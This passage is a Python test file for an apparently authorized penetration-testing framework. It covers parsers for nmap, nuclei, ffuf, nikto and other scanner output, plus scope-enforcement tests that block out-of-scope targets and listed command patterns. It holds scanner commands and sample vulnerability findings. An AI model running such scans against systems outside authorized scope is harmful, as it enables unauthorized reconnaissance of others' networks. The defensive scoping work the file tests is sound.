        os_matches = result["hosts"][0]["os_matches"]
        self.assertEqual(len(os_matches), 2)
        self.assertEqual(os_matches[0]["name"], "Linux 5.x")
        self.assertEqual(os_matches[0]["accuracy"], "95")

    def test_parses_scan_info(self):
        result = parse_nmap_xml(self.NMAP_XML)
        self.assertIn("scan_info", result)

    def test_fallback_to_text_on_invalid_xml(self):
        result = parse_nmap_xml("Not XML at all\n22/tcp open ssh")
        # Should fall back to text parser without crashing
        self.assertIn("hosts", result)


class TestNmapTextParser(unittest.TestCase):

    NMAP_TEXT = """
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.045s latency).
22/tcp   open  ssh        OpenSSH 6.6.1p1
80/tcp   open  http       Apache httpd 2.4.7
443/tcp  closed https
9929/tcp open  nping-echo Nping echo

Nmap scan report for 10.0.0.2
Host is up.
22/tcp  open  ssh
"""

    def test_parses_multiple_hosts(self):
        result = parse_nmap_text(self.NMAP_TEXT)
        self.assertEqual(len(result["hosts"]), 2)

    def test_first_host_ip(self):
        result = parse_nmap_text(self.NMAP_TEXT)
        host = result["hosts"][0]
        self.assertEqual(host["addresses"][0]["addr"], "45.33.32.156")

    def test_first_host_hostname(self):
        result = parse_nmap_text(self.NMAP_TEXT)
        host = result["hosts"][0]
        self.assertIn("scanme.nmap.org", host["hostnames"])

    def test_port_count(self):
        result = parse_nmap_text(self.NMAP_TEXT)
        self.assertEqual(len(result["hosts"][0]["ports"]), 4)

    def test_port_state(self):
        result = parse_nmap_text(self.NMAP_TEXT)
        ports = result["hosts"][0]["ports"]
        open_ports = [p for p in ports if p["state"] == "open"]
        closed_ports = [p for p in ports if p["state"] == "closed"]
        self.assertEqual(len(open_ports), 3)
        self.assertEqual(len(closed_ports), 1)

    def test_raw_preserved(self):
        result = parse_nmap_text(self.NMAP_TEXT)
        self.assertIn("raw", result)

    def test_empty_output(self):
        result = parse_nmap_text("")
        self.assertEqual(result["hosts"], [])


class TestNucleiParser(unittest.TestCase):

    NUCLEI_JSONL = (
        '{"template-id":"tech-detect","info":{"name":"Apache Detection","severity":"info"},"type":"http","host":"https://example.com","matched-at":"https://example.com"}\n'
        '{"template-id":"CVE-2021-44228","info":{"name":"Log4Shell RCE","severity":"critical","description":"Apache Log4j2 RCE","reference":["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]},"type":"http","host":"https://example.com"}\n'
        '{"template-id":"exposed-panels","info":{"name":"Admin Panel","severity":"medium","tags":["panel","admin"]},"type":"http","host":"https://example.com/admin"}\n'
    )

    def test_parses_all_findings(self):
        result = parse_nuclei_jsonl(self.NUCLEI_JSONL)
        self.assertEqual(result["total"], 3)
        self.assertEqual(len(result["findings"]), 3)

    def test_severity_counts(self):
        result = parse_nuclei_jsonl(self.NUCLEI_JSONL)
        self.assertEqual(result["by_severity"]["info"], 1)
        self.assertEqual(result["by_severity"]["critical"], 1)
        self.assertEqual(result["by_severity"]["medium"], 1)

    def test_finding_fields(self):
        result = parse_nuclei_jsonl(self.NUCLEI_JSONL)
        log4j = result["findings"][1]
        self.assertEqual(log4j["template_id"], "CVE-2021-44228")
        self.assertEqual(log4j["name"], "Log4Shell RCE")
        self.assertEqual(log4j["severity"], "critical")
        self.assertEqual(log4j["description"], "Apache Log4j2 RCE")
        self.assertIn("https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                       log4j["reference"])

    def test_tags(self):
        result = parse_nuclei_jsonl(self.NUCLEI_JSONL)
        panel = result["findings"][2]
        self.assertIn("panel", panel["tags"])
        self.assertIn("admin", panel["tags"])

    def test_empty_input(self):
        result = parse_nuclei_jsonl("")
        self.assertEqual(result["total"], 0)

    def test_invalid_json_skipped(self):
        result = parse_nuclei_jsonl("not json\n{invalid\n")
        self.assertEqual(result["total"], 0)


class TestSubfinderParser(unittest.TestCase):

    def test_parses_subdomains(self):
        output = "sub1.example.com\nsub2.example.com\nsub3.example.com\n"
        result = parse_subfinder_text(output)
        self.assertEqual(result["total"], 3)
        self.assertIn("sub1.example.com", result["subdomains"])

    def test_skips_brackets(self):
        output = "[INF] Loading...\nsub1.example.com\n"
        result = parse_subfinder_text(output)
        self.assertEqual(result["total"], 1)

    def test_empty(self):
        result = parse_subfinder_text("")
        self.assertEqual(result["total"], 0)


class TestHttpxParser(unittest.TestCase):

    HTTPX_JSONL = (
        '{"url":"https://example.com","status_code":200,"title":"Example","tech":["Nginx"],"webserver":"nginx","cdn":false}\n'
        '{"url":"https://sub.example.com","status_code":301,"title":"Redirect","tech":[],"webserver":"Apache"}\n'
    )

    def test_parses_results(self):
        result = parse_httpx_jsonl(self.HTTPX_JSONL)
        self.assertEqual(result["total"], 2)

    def test_fields(self):
        result = parse_httpx_jsonl(self.HTTPX_JSONL)
        first = result["results"][0]
        self.assertEqual(first["url"], "https://example.com")
        self.assertEqual(first["status_code"], 200)
        self.assertEqual(first["title"], "Example")
        self.assertIn("Nginx", first["tech"])

    def test_empty(self):
        result = parse_httpx_jsonl("")
        self.assertEqual(result["total"], 0)


class TestDigParser(unittest.TestCase):

    DIG_OUTPUT = """; <<>> DiG 9.18.12 <<>> example.com ANY
;; global options: +cmd
;; Got answer:
;; ANSWER SECTION:
example.com.    300    IN    A       93.184.216.34
example.com.    300    IN    AAAA    2606:2800:220:1::248
example.com.    300    IN    MX      10 mail.example.com.

;; AUTHORITY SECTION:
example.com.    300    IN    NS      ns1.example.com.
"""

    def test_parses_records(self):
        result = parse_dig(self.DIG_OUTPUT)
        self.assertEqual(result["total"], 4)

    def test_record_types(self):
        result = parse_dig(self.DIG_OUTPUT)
        types = {r["type"] for r in result["records"]}
        self.assertIn("A", types)
        self.assertIn("AAAA", types)
        self.assertIn("MX", types)
        self.assertIn("NS", types)

    def test_sections(self):
        result = parse_dig(self.DIG_OUTPUT)
        sections = {r["section"] for r in result["records"]}
        self.assertIn("answer", sections)
        self.assertIn("authority", sections)

    def test_empty(self):
        result = parse_dig("")
        self.assertEqual(result["total"], 0)


class TestWhoisParser(unittest.TestCase):

    WHOIS_OUTPUT = """% IANA WHOIS server
domain:       EXAMPLE.COM
registrar:    Example Registrar, Inc.
org:          Example LLC
creation_date: 1995-08-14T04:00:00Z
name_server:  ns1.example.com
name_server:  ns2.example.com
"""

    def test_parses_fields(self):
        result = parse_whois(self.WHOIS_OUTPUT)
        data = result["whois"]
        self.assertIn("domain", data)
        self.assertEqual(data["domain"], "EXAMPLE.COM")
        self.assertIn("registrar", data)

    def test_skips_comments(self):
        result = parse_whois(self.WHOIS_OUTPUT)
        keys = result["whois"].keys()
        self.assertTrue(all(not k.startswith("%") for k in keys))

    def test_empty(self):
        result = parse_whois("")
        self.assertEqual(result["whois"], {})


class TestNiktoParser(unittest.TestCase):

    NIKTO_OUTPUT = """- Nikto v2.5.0
+ Target IP:          10.0.0.1
+ Target Hostname:    10.0.0.1
+ Target Port:        80
+ Server: Apache/2.4.41 (Ubuntu)
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3092: /server-status: This reveals detailed server info.
+ The anti-clickjacking X-Frame-Options header is not present.
"""

    def test_server_info(self):
        result = parse_nikto(self.NIKTO_OUTPUT)
        self.assertIn("server", result["server_info"])
        self.assertIn("Apache", result["server_info"]["server"])

    def test_findings_count(self):
        result = parse_nikto(self.NIKTO_OUTPUT)
        # Lines starting with "+ " that aren't "Target" or "Server:"
        self.assertGreater(result["total"], 0)

    def test_osvdb_extracted(self):
        result = parse_nikto(self.NIKTO_OUTPUT)
        osvdb_findings = [f for f in result["findings"] if f.get("osvdb")]
        self.assertGreater(len(osvdb_findings), 0)

    def test_empty(self):
        result = parse_nikto("")
        self.assertEqual(result["total"], 0)


class TestWhatwebParser(unittest.TestCase):

    def test_parses_json_array(self):
        data = [{"target": "https://example.com", "plugins": {"Apache": {}}, "http_status": 200}]
        result = parse_whatweb(json.dumps(data))
        self.assertEqual(result["total"], 1)
        self.assertEqual(result["results"][0]["target"], "https://example.com")

    def test_invalid_json_fallback(self):
        result = parse_whatweb("not json output")
        self.assertIn("raw", result)

    def test_empty_json_array(self):
        result = parse_whatweb("[]")
        self.assertEqual(result["total"], 0)


class TestFfufParser(unittest.TestCase):

    FFUF_JSON = json.dumps({
        "commandline": "ffuf -u https://example.com/FUZZ -w wordlist.txt",
        "results": [
            {"url": "https://example.com/admin", "status": 200, "length": 1234,
             "words": 50, "lines": 30, "input": {"FUZZ": "admin"}, "redirectlocation": ""},
            {"url": "https://example.com/login", "status": 302, "length": 0,
             "words": 0, "lines": 0, "input": {"FUZZ": "login"}, "redirectlocation": "/dashboard"},
        ],
    })

    def test_parses_results(self):
        result = parse_ffuf_json(self.FFUF_JSON)
        self.assertEqual(result["total"], 2)

    def test_result_fields(self):
        result = parse_ffuf_json(self.FFUF_JSON)
        admin = result["results"][0]
        self.assertEqual(admin["url"], "https://example.com/admin")
        self.assertEqual(admin["status"], 200)
        self.assertEqual(admin["length"], 1234)

    def test_commandline(self):
        result = parse_ffuf_json(self.FFUF_JSON)
        self.assertIn("ffuf", result["commandline"])

    def test_invalid_json(self):
        result = parse_ffuf_json("not json")
        self.assertIn("raw", result)


class TestTestsslParser(unittest.TestCase):

    TESTSSL_JSON = json.dumps([
        {"id": "cert_commonName", "severity": "INFO", "finding": "CN=example.com"},
        {"id": "BEAST", "severity": "LOW", "finding": "BEAST (CVE-2011-3389) -- noass"},
        {"id": "POODLE_SSL", "severity": "CRITICAL", "finding": "POODLE SSL (CVE-2014-3566) VULNERABLE"},
    ])

    def test_parses_findings(self):
        result = parse_testssl(self.TESTSSL_JSON)
        self.assertEqual(result["total"], 3)

    def test_finding_fields(self):
        result = parse_testssl(self.TESTSSL_JSON)
        poodle = result["findings"][2]
        self.assertEqual(poodle["id"], "POODLE_SSL")
        self.assertEqual(poodle["severity"], "CRITICAL")
        self.assertIn("VULNERABLE", poodle["finding"])

    def test_invalid_json(self):
        result = parse_testssl("not json")
        self.assertIn("raw", result)


# ═══════════════════════════════════════════════════════════════════
# tools.py finding generator tests
# ═══════════════════════════════════════════════════════════════════


class TestFindingsFromNuclei(unittest.TestCase):

    def _make_result(self):
        return ToolResult(
            tool_name="nuclei",
            command="nuclei -u https://example.com",
            parsed={
                "findings": [
                    {"name": "Apache Detection", "severity": "info",
                     "template_id": "tech-detect", "host": "https://example.com",
                     "description": "", "reference": []},
                    {"name": "Log4Shell RCE", "severity": "critical",
                     "template_id": "CVE-2021-44228", "host": "https://example.com",
                     "description": "Log4j RCE", "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]},
                ],
                "total": 2,
            },
        )

    def test_generates_findings(self):
        result = self._make_result()
        findings = findings_from_nuclei(result)
        self.assertEqual(len(findings), 2)

    def test_severity_mapping(self):
        result = self._make_result()
        findings = findings_from_nuclei(result)
        severities = {f.severity for f in findings}
        self.assertIn(Severity.INFO, severities)
        self.assertIn(Severity.CRITICAL, severities)

    def test_finding_details(self):
        result = self._make_result()
        findings = findings_from_nuclei(result)
        critical = [f for f in findings if f.severity == Severity.CRITICAL][0]
        self.assertEqual(critical.title, "Log4Shell RCE")
        self.assertEqual(critical.target, "https://example.com")

    def test_empty_parsed(self):
        result = ToolResult(tool_name="nuclei", command="", parsed={})
        findings = findings_from_nuclei(result)
        self.assertEqual(len(findings), 0)


class TestFindingsFromNmap(unittest.TestCase):

    def _make_result(self):
        return ToolResult(
            tool_name="nmap",
            command="nmap -sV 10.0.0.1",
            parsed={
                "hosts": [{
                    "addresses": [{"addr": "10.0.0.1", "type": "ipv4"}],
                    "ports": [
                        {"port": 22, "protocol": "tcp", "state": "open",
                         "service": "ssh", "product": "OpenSSH", "version": "8.9"},
                        {"port": 23, "protocol": "tcp", "state": "open",
                         "service": "telnet", "product": "", "version": ""},
                        {"port": 443, "protocol": "tcp", "state": "closed",
                         "service": "https", "product": "", "version": ""},
                    ],
                }],
            },
        )

    def test_generates_findings_for_open_ports(self):
        result = self._make_result()
        findings = findings_from_nmap(result)
        # Only open ports get findings, closed ports are skipped
        self.assertEqual(len(findings), 2)

    def test_risky_service_elevated_severity(self):
        result = self._make_result()
        findings = findings_from_nmap(result)
        telnet_finding = [f for f in findings if f.port == 23][0]
        self.assertEqual(telnet_finding.severity, Severity.HIGH)

    def test_normal_service_info_severity(self):
        result = self._make_result()
        findings = findings_from_nmap(result)
        ssh_finding = [f for f in findings if f.port == 22][0]
        self.assertEqual(ssh_finding.severity, Severity.INFO)

    def test_finding_target(self):
        result = self._make_result()
        findings = findings_from_nmap(result)
        for f in findings:
            self.assertEqual(f.target, "10.0.0.1")

    def test_empty_parsed(self):
        result = ToolResult(tool_name="nmap", command="", parsed={})
        findings = findings_from_nmap(result)
        self.assertEqual(len(findings), 0)


# ═══════════════════════════════════════════════════════════════════
# Integration-ish tests (scope + executor pipeline)
# ═══════════════════════════════════════════════════════════════════


class TestScopeExecutorIntegration(unittest.TestCase):
    """Verify the scope → executor pipeline works end-to-end."""

    def test_full_pipeline_dry_run(self):
        """Scope validation → command build → dry run → evidence."""
        config = ArsenalConfig(use_docker=False, dry_run=True)
        scope = Scope(
            rules=[
                ScopeRule(ScopeAction.ALLOW, "domain", "*.target.com"),
                ScopeRule(ScopeAction.ALLOW, "cidr", "172.16.0.0/16"),
            ],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        scope.sign()
        mission = Mission(name="Integration Test", scope=scope)
        enforcer = ScopeEnforcer(mission)
        executor = ToolExecutor(config, mission, enforcer)

        # Register a test tool
        spec = ToolSpec("nmap", ToolCategory.SCAN, "nmap", safe=True)
        spec.available = True
        executor.register_tool(spec)

        # Execute against in-scope target
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("nmap", ["-sV", "172.16.0.1"],
                             target="172.16.0.1")
        )
        loop.close()

        self.assertTrue(result.success)
        self.assertIn("[DRY RUN]", result.stdout)

    def test_full_pipeline_scope_deny(self):
        """Out-of-scope target should be blocked at the executor level."""
        config = ArsenalConfig(use_docker=False, dry_run=True)
        scope = Scope(
            rules=[ScopeRule(ScopeAction.ALLOW, "ip", "10.0.0.1")],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        scope.sign()
        mission = Mission(name="Block Test", scope=scope)
        enforcer = ScopeEnforcer(mission)
        executor = ToolExecutor(config, mission, enforcer)

        spec = ToolSpec("nmap", ToolCategory.SCAN, "nmap", safe=True)
        spec.available = True
        executor.register_tool(spec)

        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("nmap", ["-sV", "evil.com"], target="evil.com")
        )
        loop.close()

        self.assertFalse(result.success)
        self.assertIn("SCOPE VIOLATION", result.error)

    def test_mission_artifacts_after_pipeline(self):
        """After pipeline execution, mission should contain evidence + audit entries."""
        config = ArsenalConfig(use_docker=False, dry_run=False, save_raw_output=False)
        scope = Scope(
            rules=[ScopeRule(ScopeAction.ALLOW, "ip", "127.0.0.1")],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        scope.sign()
        mission = Mission(name="Artifact Test", scope=scope)
        enforcer = ScopeEnforcer(mission)
        executor = ToolExecutor(config, mission, enforcer)

        spec = ToolSpec("echo", ToolCategory.UTIL, "echo", safe=True)
        spec.available = True
        executor.register_tool(spec)

        loop = asyncio.new_event_loop()
        loop.run_until_complete(
            executor.execute("echo", ["artifact-data"], target="127.0.0.1")
        )
        loop.close()

        self.assertEqual(len(mission.evidence), 1)
        self.assertTrue(mission.evidence[0].sha256)
        self.assertGreater(len(mission.audit_log), 0)

        # Mission can be serialized
        d = mission.to_dict()
        self.assertEqual(len(d["evidence"]), 1)


# ═══════════════════════════════════════════════════════════════════
# Edge case tests
# ═══════════════════════════════════════════════════════════════════


class TestEdgeCases(unittest.TestCase):

    def test_scope_with_only_deny_rules(self):
        """Scope with only deny rules should deny everything."""
        scope = Scope(
            rules=[ScopeRule(ScopeAction.DENY, "ip", "10.0.0.1")],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        self.assertFalse(scope.check("10.0.0.1", "ip"))
        self.assertFalse(scope.check("10.0.0.2", "ip"))

    def test_scope_rule_note(self):
        rule = ScopeRule(ScopeAction.ALLOW, "ip", "10.0.0.1",
                         note="Authorized per SOW §3.2")
        self.assertEqual(rule.note, "Authorized per SOW §3.2")

    def test_evidence_without_output_has_empty_hash(self):
        e = Evidence()
        h = e.compute_hash()
        expected = hashlib.sha256(b"").hexdigest()
        self.assertEqual(h, expected)

    def test_finding_phase_default(self):
        f = Finding()
        self.assertEqual(f.phase, MissionPhase.VULNERABILITY_ANALYSIS)

    def test_scope_from_dict_empty(self):
        scope = Scope.from_dict({})
        self.assertEqual(len(scope.rules), 0)
        self.assertEqual(scope.authorized_by, "")

    def test_nmap_text_parser_with_no_parenthesized_ip(self):
        """Host without parenthesized IP should still parse."""
        output = "Nmap scan report for 10.0.0.1\n22/tcp open ssh\n"
        result = parse_nmap_text(output)
        self.assertEqual(len(result["hosts"]), 1)
        # When no parenthesized IP, the full target string is used
        self.assertEqual(result["hosts"][0]["addresses"][0]["addr"], "10.0.0.1")

    def test_multiple_blocked_patterns(self):
        """Verify all blocked patterns are actually blocked."""
        config = ArsenalConfig(use_docker=False, dry_run=True)
        scope = Scope(valid_from=time.time() - 3600, valid_until=time.time() + 3600)
        mission = Mission(scope=scope)
        enforcer = ScopeEnforcer(mission)
        executor = ToolExecutor(config, mission, enforcer)

        for pattern in BLOCKED_PATTERNS:
            violation = executor._sanitize_command(f"tool {pattern}")
            self.assertIsNotNone(
                violation,
                f"Pattern '{pattern}' should be blocked but wasn't"
            )


# ═══════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════


if __name__ == "__main__":
    unittest.main()
